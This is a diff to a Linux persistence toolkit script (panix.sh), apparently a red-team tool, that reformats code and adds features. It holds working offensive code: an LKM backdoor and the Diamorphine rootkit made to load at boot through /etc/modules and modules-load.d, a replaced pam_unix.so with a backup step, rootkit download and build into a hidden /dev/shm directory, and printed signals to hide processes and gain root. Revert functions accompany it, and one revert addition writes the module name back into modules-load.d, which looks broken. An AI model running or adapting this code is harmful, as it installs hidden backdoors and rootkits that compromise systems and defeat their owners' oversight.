@@ -2408,10 +2408,10 @@ setup_lkm_backdoor() {
 		# Ensure proper escaping for C string
 		command="\"/bin/bash\",\"-c\",\"$command\",NULL"
 		lkm_destination="$lkm_path"
-        mkdir -p $(dirname $lkm_destination)
+		mkdir -p $(dirname $lkm_destination)
 	fi
 
-    mkdir -p ${lkm_compile_dir}
+	mkdir -p ${lkm_compile_dir}
 
 	cat <<-EOF > ${lkm_source}
 	#include <linux/module.h>
@@ -2454,12 +2454,12 @@ setup_lkm_backdoor() {
 	MODULE_DESCRIPTION("LKM Backdoor");
 	EOF
 
-    # Check if the source file was created
-    if [ ! -f "$lkm_source" ]; then
-        echo "Failed to create the kernel module source code at $lkm_source"
-        exit 1
-    else
-		echo "Kernel module source code created: $lkm_source"
+	# Check if the source file was created
+	if [ ! -f "$lkm_source" ]; then
+		echo "[-] Failed to create the kernel module source code at $lkm_source"
+		exit 1
+	else
+		echo "[+] Kernel module source code created: $lkm_source"
 	fi
 
 	# Create the Makefile
@@ -2474,11 +2474,11 @@ clean:
 	make -C /lib/modules/\$(shell uname -r)/build M=\$(PWD) clean
 EOF
 
-    if [ ! -f "${lkm_compile_dir}/Makefile" ]; then
-		echo "Failed to create the Makefile at ${lkm_compile_dir}/Makefile"
+	if [ ! -f "${lkm_compile_dir}/Makefile" ]; then
+		echo "[-] Failed to create the Makefile at ${lkm_compile_dir}/Makefile"
 		exit 1
-    else
-		echo "Makefile created: ${lkm_compile_dir}/Makefile"
+	else
+		echo "[+] Makefile created: ${lkm_compile_dir}/Makefile"
 	fi
 
 	# Compile the kernel module using make
@@ -2486,7 +2486,7 @@ EOF
 	make
 
 	if [ $? -ne 0 ]; then
-		echo "Compilation failed. Exiting."
+		echo "[-] Compilation failed. Exiting."
 		exit 1
 	fi
 
@@ -2494,19 +2494,36 @@ EOF
 	cp ${lkm_compile_dir}/${lkm_name}.ko ${lkm_destination}
 
 	if [ $? -ne 0 ]; then
-		echo "Copying module failed. Exiting."
+		echo "[-] Copying module failed. Exiting."
 		exit 1
 	fi
 
-	echo "Kernel module compiled successfully: ${lkm_destination}"
+	echo "[+] Kernel module compiled successfully: ${lkm_destination}"
 
 	sudo insmod ${lkm_destination}
 	if [[ $? -ne 0 ]]; then
-		echo "Failed to load the kernel module. Check dmesg for errors."
+		echo "[-] Failed to load the kernel module. Check dmesg for errors."
 		exit 1
 	fi
 
-	echo "Kernel module loaded successfully. Check dmesg for the output."
+	# Add kernel module to /etc/modules, /etc/modules-load.d/ and /usr/lib/modules-load.d/
+	echo "[+] Adding kernel module to /etc/modules, /etc/modules-load.d/ and /usr/lib/modules-load.d/..."
+	if [ -d "/etc/modules-load.d" ]; then
+		echo "${lkm_name}" > /etc/modules-load.d/${lkm_name}.conf
+	fi
+
+	if [ -d "/usr/lib/modules-load.d" ]; then
+		echo "${lkm_name}" > /usr/lib/modules-load.d/${lkm_name}.conf
+	fi
+
+	if [ -f "/etc/modules" ]; then
+		if ! grep -q "^${lkm_name}$" /etc/modules; then
+			echo "${lkm_name}" >> /etc/modules
+		fi
+	fi
+
+	echo "[+] Kernel module loaded successfully. Check dmesg for the output."
+	echo "[+] Kernel module added to /etc/modules, /etc/modules-load.d/ and /usr/lib/modules-load.d/"
 	echo "[+] LKM backdoor established!"
 }
 
@@ -2565,6 +2582,12 @@ revert_lkm() {
 	else
 		echo "[-] Temporary directory '${lkm_compile_dir}' not found."
 	fi
+
+	# Remove panix from /etc/modules, /etc/modules-load.d/panix.conf and /usr/lib/modules-load.d/panix.conf
+	echo "[+] Removing panix from /etc/modules, /etc/modules-load.d/ and /usr/lib/modules-load.d/..."
+	sed -i '/panix/d' /etc/modules
+	rm -f /etc/modules-load.d/panix.conf
+	rm -f /usr/lib/modules-load.d/panix.conf
 
 	# Update module dependencies
 	echo "[+] Updating module dependencies..."
@@ -2884,97 +2907,104 @@ setup_malicious_package() {
 
 # Revert Module: revert_malicious_package.sh
 revert_malicious_package() {
-    usage_revert_malicious_package() {
-        echo "Usage: ./panix.sh --revert malicious-package"
-        echo "Reverts any changes made by the setup_malicious_package module."
-    }
+	usage_revert_malicious_package() {
+		echo "Usage: ./panix.sh --revert malicious-package"
+		echo "Reverts any changes made by the setup_malicious_package module."
+	}
 
-    echo "[+] Reverting malicious package..."
+	echo "[+] Reverting malicious package..."
 
-    if ! check_root; then
-        echo "Error: This function can only be run as root."
-        return 1
-    fi
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		return 1
+	fi
 
-    local mechanism=""
-    local PACKAGE_NAME="panix"
+	local mechanism=""
+	local PACKAGE_NAME="panix"
 
-    # Detect if RPM or DPKG was used
-    if command -v rpm &> /dev/null && rpm -qa | grep -q "^${PACKAGE_NAME}"; then
-        mechanism="rpm"
-    elif command -v dpkg &> /dev/null && dpkg -l | grep -q "^ii  ${PACKAGE_NAME} "; then
-        mechanism="dpkg"
-    else
-        echo "[-] Malicious package '${PACKAGE_NAME}' not found via RPM or DPKG. No action needed."
-    fi
+	# Detect if RPM or DPKG was used
+	if command -v rpm &> /dev/null && rpm -qa | grep -q "^${PACKAGE_NAME}"; then
+		mechanism="rpm"
+	elif command -v dpkg &> /dev/null && dpkg -l | grep -q "^ii  ${PACKAGE_NAME} "; then
+		mechanism="dpkg"
+	else
+		echo "[-] Malicious package '${PACKAGE_NAME}' not found via RPM or DPKG. No action needed."
+	fi
 
-    if [[ "$mechanism" == "rpm" ]]; then
-        echo "[+] Removing RPM package '${PACKAGE_NAME}'..."
-        rpm -e --noscripts "${PACKAGE_NAME}"
-        if [[ $? -eq 0 ]]; then
-            echo "[+] RPM package '${PACKAGE_NAME}' removed successfully."
-        else
-            echo "[-] Failed to remove RPM package '${PACKAGE_NAME}'."
-        fi
+	if [[ "$mechanism" == "rpm" ]]; then
+		echo "[+] Removing RPM package '${PACKAGE_NAME}'..."
+		rpm -e --noscripts "${PACKAGE_NAME}"
+		if [[ $? -eq 0 ]]; then
+			echo "[+] RPM package '${PACKAGE_NAME}' removed successfully."
+		else
+			echo "[-] Failed to remove RPM package '${PACKAGE_NAME}'."
+		fi
 
-        # Remove the RPM file from /var/lib/rpm
-        if [[ -f "/var/lib/rpm/${PACKAGE_NAME}.rpm" ]]; then
-            echo "[+] Removing RPM file '/var/lib/rpm/${PACKAGE_NAME}.rpm'..."
-            rm -f "/var/lib/rpm/${PACKAGE_NAME}.rpm"
-            echo "[+] RPM file removed."
-        else
-            echo "[-] RPM file '/var/lib/rpm/${PACKAGE_NAME}.rpm' not found."
-        fi
+		# Remove the RPM file from /var/lib/rpm
+		if [[ -f "/var/lib/rpm/${PACKAGE_NAME}.rpm" ]]; then
+			echo "[+] Removing RPM file '/var/lib/rpm/${PACKAGE_NAME}.rpm'..."
+			rm -f "/var/lib/rpm/${PACKAGE_NAME}.rpm"
+			echo "[+] RPM file removed."
+		else
+			echo "[-] RPM file '/var/lib/rpm/${PACKAGE_NAME}.rpm' not found."
+		fi
 
-    elif [[ "$mechanism" == "dpkg" ]]; then
-        echo "[+] Removing DPKG package '${PACKAGE_NAME}'..."
-        dpkg --purge "${PACKAGE_NAME}"
-        if [[ $? -eq 0 ]]; then
-            echo "[+] DPKG package '${PACKAGE_NAME}' removed successfully."
-        else
-            echo "[-] Failed to remove DPKG package '${PACKAGE_NAME}'."
-        fi
-    fi
+	elif [[ "$mechanism" == "dpkg" ]]; then
+		echo "[+] Removing DPKG package '${PACKAGE_NAME}'..."
+		dpkg --purge "${PACKAGE_NAME}"
+		if [[ $? -eq 0 ]]; then
+			echo "[+] DPKG package '${PACKAGE_NAME}' removed successfully."
+		else
+			echo "[-] Failed to remove DPKG package '${PACKAGE_NAME}'."
+		fi
+	fi
 
-    # Remove the cron job added by the setup function
-    echo "[+] Removing cron job associated with '${PACKAGE_NAME}'..."
-    # Create a temporary file to store the current crontab
-    crontab -l > /tmp/current_cron$$ 2>/dev/null
-    if [[ $? -ne 0 ]]; then
-        echo "[-] No crontab for user $(whoami). No action needed."
-        rm -f /tmp/current_cron$$
-    else
-        # Remove lines containing the malicious package commands
-        grep -v ".*${PACKAGE_NAME}.*" /tmp/current_cron$$ > /tmp/new_cron$$
-        # Install the new crontab
-        crontab /tmp/new_cron$$
-        echo "[+] Cron job removed."
-        # Clean up temporary files
-        rm -f /tmp/current_cron$$ /tmp/new_cron$$
-    fi
+	# Remove the cron job added by the setup function
+	echo "[+] Removing cron job associated with '${PACKAGE_NAME}'..."
+	# Create a temporary file to store the current crontab
+	crontab -l > /tmp/current_cron$$ 2>/dev/null
+	if [[ $? -ne 0 ]]; then
+		echo "[-] No crontab for user $(whoami). No action needed."
+		rm -f /tmp/current_cron$$
+	else
+		# Remove lines containing the malicious package commands
+		grep -v ".*${PACKAGE_NAME}.*" /tmp/current_cron$$ > /tmp/new_cron$$
+		# Install the new crontab
+		crontab /tmp/new_cron$$
+		echo "[+] Cron job removed."
+		# Clean up temporary files
+		rm -f /tmp/current_cron$$ /tmp/new_cron$$
+	fi
 
-    # Clean up any remaining build directories (RPM)
-    if [[ -d "~/rpmbuild" ]]; then
-        echo "[+] Removing RPM build directory '~/rpmbuild'..."
-        rm -rf ~/rpmbuild
-        echo "[+] RPM build directory removed."
-    fi
+	# Clean up any remaining build directories (RPM)
+	if [[ -d "~/rpmbuild" ]]; then
+		echo "[+] Removing RPM build directory '~/rpmbuild'..."
+		rm -rf ~/rpmbuild
+		echo "[+] RPM build directory removed."
+	fi
 
-    # Clean up any remaining package directories (DPKG)
-    if [[ -d "${PACKAGE_NAME}" ]]; then
-        echo "[+] Removing package directory '${PACKAGE_NAME}'..."
-        rm -rf "${PACKAGE_NAME}"
-        echo "[+] Package directory removed."
-    fi
+	# Clean up any remaining package directories (DPKG)
+	if [[ -d "${PACKAGE_NAME}" ]]; then
+		echo "[+] Removing package directory '${PACKAGE_NAME}'..."
+		rm -rf "${PACKAGE_NAME}"
+		echo "[+] Package directory removed."
+	fi
 
-    # Remove any lingering files in /var/lib/dpkg/info (DPKG)
-    if [[ -d "/var/lib/dpkg/info" ]]; then
-        echo "[+] Cleaning up '/var/lib/dpkg/info'..."
-        rm -f "/var/lib/dpkg/info/${PACKAGE_NAME}."*
-        echo "[+] Cleanup completed."
-    fi
+	# Remove any lingering files in /var/lib/dpkg/info (DPKG)
+	if [[ -d "/var/lib/dpkg/info" ]]; then
+		echo "[+] Cleaning up '/var/lib/dpkg/info'..."
+		rm -f "/var/lib/dpkg/info/${PACKAGE_NAME}."*
+		echo "[+] Cleanup completed."
+	fi
 
-    return 0
+	# Remove any package files left in the home directory
+	if [[ -f "~/${PACKAGE_NAME}.deb" || -f "~/${PACKAGE_NAME}.rpm" ]]; then
+		echo "[+] Removing package files '~/${PACKAGE_NAME}.deb' and/or '~/${PACKAGE_NAME}.rpm'..."
+		rm -f ~/${PACKAGE_NAME}.deb ~/${PACKAGE_NAME}.rpm
+		echo "[+] Package files removed."
+	fi
+
+	return 0
 }
 
 # Module: setup_motd_backdoor.sh
@@ -3585,9 +3615,11 @@ setup_pam_persistence() {
 			local dest_dir=""
 			local possible_dirs=(
 				"/lib/security"
-				"/usr/lib64/security"
-				"/lib/x86_64-linux-gnu/security"
 				"/lib64/security"
+				"/lib/x86_64-linux-gnu/security"
+				"/usr/lib/security"
+				"/usr/lib64/security"
+				"/usr/lib/x86_64-linux-gnu/security"
 			)
 
 			for dir in "${possible_dirs[@]}"; do
@@ -3601,6 +3633,9 @@ setup_pam_persistence() {
 				echo "[-] Could not detect a valid PAM library directory."
 				exit 1
 			fi
+
+			echo "[+] Backing up original PAM library..."
+			mv -f "$dest_dir/pam_unix.so" "$dest_dir/pam_unix.so.bak"
 
 			echo "[+] Copying PAM library to $dest_dir..."
 			mv -f modules/pam_unix/.libs/pam_unix.so "$dest_dir"
@@ -3769,52 +3804,29 @@ revert_pam() {
 		return 1
 	fi
 
-	# Function to restore the original pam_unix.so module
-	restore_pam_module() {
-		echo "[+] Restoring original PAM module..."
-
-		# Detect the Linux distribution and package manager
-		if [ -f /etc/os-release ]; then
-			. /etc/os-release
-			linux_distro=${ID_LIKE:-$ID}
-		else
-			linux_distro=$(uname -s | tr '[:upper:]' '[:lower:]')
-		fi
-
-		case "$linux_distro" in
-			*ubuntu*|*debian*|*mint*|*kali*)
-				echo "[+] Detected Debian-based distribution."
-				echo "[+] Reinstalling 'libpam-modules' package..."
-				apt-get update >/dev/null 2>&1
-				apt-get install --reinstall -y libpam-modules >/dev/null 2>&1
+	remove_rogue_pam() {
+		echo "[+] Searching for rogue PAM module"
+		# Check for the presence of the malicious PAM module
+		pam_module_paths=(
+			"/lib/security/pam_unix.so"
+			"/usr/lib/security/pam_unix.so"
+			"/usr/lib64/security/pam_unix.so"
+			"/lib/x86_64-linux-gnu/security/pam_unix.so"
+			"/usr/lib/x86_64-linux-gnu/security/pam_unix.so"
+			"/lib64/security/pam_unix.so"
+		)
+		
+		# Revert pam_unix.so with the pam_unix.so.bak backup 
+		for pam_module in "${pam_module_paths[@]}"; do
+			if [[ -f "$pam_module.bak" ]]; then
+				mv -f "$pam_module.bak" "$pam_module"
 				if [[ $? -eq 0 ]]; then
-					echo "[+] 'libpam-modules' reinstalled successfully."
+					echo "[+] Restored original PAM module '$pam_module'."
 				else
-					echo "[-] Failed to reinstall 'libpam-modules'."
+					echo "[-] Failed to restore original PAM module '$pam_module'."
 				fi
-				;;
-			*rhel*|*centos*|*fedora*)
-				echo "[+] Detected RPM-based distribution."
-				echo "[+] Reinstalling 'pam' package..."
-				if command -v yum &>/dev/null; then
-					yum reinstall -y pam >/dev/null 2>&1
-				elif command -v dnf &>/dev/null; then
-					dnf reinstall -y pam >/dev/null 2>&1
-				else
-					echo "[-] Neither 'yum' nor 'dnf' package manager found."
-					return 1
-				fi
-				if [[ $? -eq 0 ]]; then
-					echo "[+] 'pam' reinstalled successfully."
-				else
-					echo "[-] Failed to reinstall 'pam'."
-				fi
-				;;
-			*)
-				echo "[-] Unsupported distribution: $linux_distro"
-				return 1
-				;;
-		esac
+			fi
+		done
 	}
 
 	# Function to remove malicious PAM_EXEC configurations and scripts
@@ -3895,32 +3907,8 @@ revert_pam() {
 		fi
 	}
 
-	# Check for the presence of the malicious PAM module
-	is_pam_module_replaced=false
-	pam_module_paths=(
-		"/lib/security/pam_unix.so"
-		"/usr/lib64/security/pam_unix.so"
-		"/lib/x86_64-linux-gnu/security/pam_unix.so"
-		"/lib64/security/pam_unix.so"
-	)
-	for pam_module in "${pam_module_paths[@]}"; do
-		if [[ -f "$pam_module" ]]; then
-			# Check if the pam_unix.so has been modified
-			if strings "$pam_module" | grep -q "PANIX"; then
-				is_pam_module_replaced=true
-				break
-			fi
-		fi
-	done
-
-	if [[ "$is_pam_module_replaced" = true ]]; then
-		echo "[+] Malicious PAM module detected."
-		restore_pam_module
-	else
-		echo "[-] No malicious PAM module detected."
-	fi
-
 	# Remove PAM_EXEC backdoor and logging
+	remove_rogue_pam
 	remove_pam_exec_backdoor
 	remove_pam_exec_logging
 
@@ -4870,25 +4858,25 @@ revert_reverse_shell() {
 
 # Module: setup_rootkit.sh
 setup_rootkit() {
-    # References:
-    # Diamorphine Rootkit: https://github.com/m0nad/Diamorphine
-    # Inspiration: https://github.com/MatheuZSecurity/D3m0n1z3dShell/blob/main/scripts/implant_rootkit.sh
-    # Inspiration: https://github.com/Trevohack/DynastyPersist/blob/main/src/dynasty.sh#L194
+	# References:
+	# Diamorphine Rootkit: https://github.com/m0nad/Diamorphine
+	# Inspiration: https://github.com/MatheuZSecurity/D3m0n1z3dShell/blob/main/scripts/implant_rootkit.sh
+	# Inspiration: https://github.com/Trevohack/DynastyPersist/blob/main/src/dynasty.sh#L194
 
-    local rk_path="/dev/shm/.rk"
+	local rk_path="/dev/shm/.rk"
 	local tmp_path="/tmp"
-    local zip_url="https://github.com/Aegrah/Diamorphine/releases/download/v1.0.0/diamorphine.zip"
-    local tar_url="https://github.com/Aegrah/Diamorphine/releases/download/v1.0.0/diamorphine.tar"
-    local clone_url="https://github.com/Aegrah/Diamorphine.git"
-    local secret=""
-    local identifier=""
+	local zip_url="https://github.com/Aegrah/Diamorphine/releases/download/v1.0.0/diamorphine.zip"
+	local tar_url="https://github.com/Aegrah/Diamorphine/releases/download/v1.0.0/diamorphine.tar"
+	local clone_url="https://github.com/Aegrah/Diamorphine.git"
+	local secret=""
+	local identifier=""
 
 	if ! check_root; then
 		echo "Error: This function can only be run as root."
 		exit 1
 	fi
 
-    usage_rootkit() {
+	usage_rootkit() {
 		echo "Usage: ./panix.sh --rootkit"
 		echo "--examples                 Display command examples"
 		echo "--secret <secret>          Specify the secret"
@@ -4953,57 +4941,57 @@ setup_rootkit() {
 		exit 1
 	fi
 
-    echo "[!] There are known issues with the Diamorphine rootkit for Ubuntu 22.04."
-    echo "[!] This module is tested on Debian 11, 12, RHEL 9, CentOS Stream 9 and CentOS 7."
-    echo "[!] I cannot guarantee that it will work on other distributions."
-    sleep 5
+	echo "[!] There are known issues with the Diamorphine rootkit for Ubuntu 22.04."
+	echo "[!] This module is tested on Debian 11, 12, RHEL 9, CentOS Stream 9 and CentOS 7."
+	echo "[!] I cannot guarantee that it will work on other distributions."
+	sleep 5
 
-    mkdir -p $rk_path
+	mkdir -p $rk_path
 
-    # Check if wget or curl is installed
-    if command -v wget >/dev/null 2>&1; then
-        downloader="wget"
-    elif command -v curl >/dev/null 2>&1; then
-        downloader="curl"
-    else
-        echo "Error: Neither 'wget' nor 'curl' is installed. Please install one of them to proceed."
-        exit 1
-    fi
+	# Check if wget or curl is installed
+	if command -v wget >/dev/null 2>&1; then
+		downloader="wget"
+	elif command -v curl >/dev/null 2>&1; then
+		downloader="curl"
+	else
+		echo "Error: Neither 'wget' nor 'curl' is installed. Please install one of them to proceed."
+		exit 1
+	fi
 
-    # Function to download files using the available downloader
-    download_file() {
-        local url="$1"
-        local output="$2"
-        if [ "$downloader" = "wget" ]; then
-            wget -O "$output" "$url"
-        else
-            curl -L -o "$output" "$url"
-        fi
-    }
+	# Function to download files using the available downloader
+	download_file() {
+		local url="$1"
+		local output="$2"
+		if [ "$downloader" = "wget" ]; then
+			wget -O "$output" "$url"
+		else
+			curl -L -o "$output" "$url"
+		fi
+	}
 
-    # Check for zip/unzip
-    if command -v zip >/dev/null 2>&1 && command -v unzip >/dev/null 2>&1; then
-        echo "zip/unzip is available. Downloading diamorphine.zip..."
-        download_file "${zip_url}" "${tmp_path}/diamorphine.zip"
-        unzip "${tmp_path}/diamorphine.zip" -d "${tmp_path}/diamorphine"
+	# Check for zip/unzip
+	if command -v zip >/dev/null 2>&1 && command -v unzip >/dev/null 2>&1; then
+		echo "zip/unzip is available. Downloading diamorphine.zip..."
+		download_file "${zip_url}" "${tmp_path}/diamorphine.zip"
+		unzip "${tmp_path}/diamorphine.zip" -d "${tmp_path}/diamorphine"
 		mv ${tmp_path}/diamorphine/Diamorphine-master/* "${rk_path}/"
 
-    # Check for tar
-    elif command -v tar >/dev/null 2>&1; then
-        echo "tar is available. Downloading diamorphine.tar..."
-        download_file "${tar_url}" "${tmp_path}/diamorphine.tar"
-        tar -xf "${tmp_path}/diamorphine.tar" -C "${rk_path}/" --strip-components=1
+	# Check for tar
+	elif command -v tar >/dev/null 2>&1; then
+		echo "tar is available. Downloading diamorphine.tar..."
+		download_file "${tar_url}" "${tmp_path}/diamorphine.tar"
+		tar -xf "${tmp_path}/diamorphine.tar" -C "${rk_path}/" --strip-components=1
 
-    # Check for git
-    elif command -v git >/dev/null 2>&1; then
-        echo "git is available. Cloning diamorphine.git..."
-        git clone "${clone_url}" "${tmp_path}/diamorphine"
+	# Check for git
+	elif command -v git >/dev/null 2>&1; then
+		echo "git is available. Cloning diamorphine.git..."
+		git clone "${clone_url}" "${tmp_path}/diamorphine"
 		mv ${tmp_path}/diamorphine/* "${rk_path}/"
-    # If none are available
-    else
-        echo "Error: None of unzip, tar, or git is installed. Please install one of them to proceed, or download Diamorphine manually."
-        exit 1
-    fi
+	# If none are available
+	else
+		echo "Error: None of unzip, tar, or git is installed. Please install one of them to proceed, or download Diamorphine manually."
+		exit 1
+	fi
 
 	# Obfuscate most obvious strings
 	# Files
@@ -5057,17 +5045,34 @@ setup_rootkit() {
 	fi
 
 	make -C ${rk_path} clean
-    touch ${rk_path}/restore_${identifier}.ko
+	touch ${rk_path}/restore_${identifier}.ko
+
+	# Add kernel module to /etc/modules, /etc/modules-load.d/ and /usr/lib/modules-load.d/
+	echo "[+] Adding kernel module to /etc/modules, /etc/modules-load.d/ and /usr/lib/modules-load.d..."
+
+	if [ -d "/etc/modules-load.d" ]; then
+		echo "${identifier}" > /etc/modules-load.d/${identifier}.conf
+	fi
+
+	if [ -d "/usr/lib/modules-load.d" ]; then
+		echo "${identifier}" > /usr/lib/modules-load.d/${identifier}.conf
+	fi
+
+	if [ -f "/etc/modules" ]; then
+		if ! grep -q "^${identifier}$" /etc/modules; then
+			echo "${identifier}" >> /etc/modules
+		fi
+	fi
 
 	echo "[+] Diamorphine rootkit has been installed."
-    echo "[+] The secret is: ${secret}"
-    echo "[+] The identifier is: ${identifier}"
+	echo "[+] The secret is: ${secret}"
+	echo "[+] The identifier is: ${identifier}"
 
-    echo "[+] kill -31 pid: hide/unhide any process;"
-    echo "[+] kill -63 pid: turns the module (in)visible;"
-    echo "[+] kill -64 pid: become root;"
-    echo "[+] Any file starting with ${secret} is hidden."
-    echo "[+] Source: https://github.com/m0nad/Diamorphine"
+	echo "[+] kill -31 pid: hide/unhide any process;"
+	echo "[+] kill -63 pid: turns the module (in)visible;"
+	echo "[+] kill -64 pid: become root;"
+	echo "[+] Any file starting with ${secret} is hidden."
+	echo "[+] Source: https://github.com/m0nad/Diamorphine"
 }
 
 # Revert Module: revert_rootkit.sh
@@ -5172,6 +5177,24 @@ revert_rootkit() {
 			fi
 		done
 	fi
+
+	# Remove the module from /etc/modules, /etc/modules-load.d/ and /usr/lib/modules-load.d/
+	echo "[+] Removing rootkit module from /etc/modules, /etc/modules-load.d/ and /usr/lib/modules-load.d/..."
+	if [ -d "/etc/modules-load.d" ]; then
+		echo "${rk_name}" > /etc/modules-load.d/${rk_name}.conf
+	fi
+
+	if [ -d "/usr/lib/modules-load.d" ]; then
+		echo "${rk_name}" > /usr/lib/modules-load.d/${rk_name}.conf
+	fi
+
+	if [ -f "/etc/modules" ]; then
+		if grep -q "^${rk_name}$" /etc/modules; then
+			sed -i "/^${rk_name}$/d" /etc/modules
+		fi
+	fi
+
+	echo "[+] Rootkit module removed from /etc/modules, /etc/modules-load.d/ and /usr/lib/modules-load.d/"
 
 	# Step 4: Remove /dev/shm/.rk directory
 	remove_directory "$rk_path"
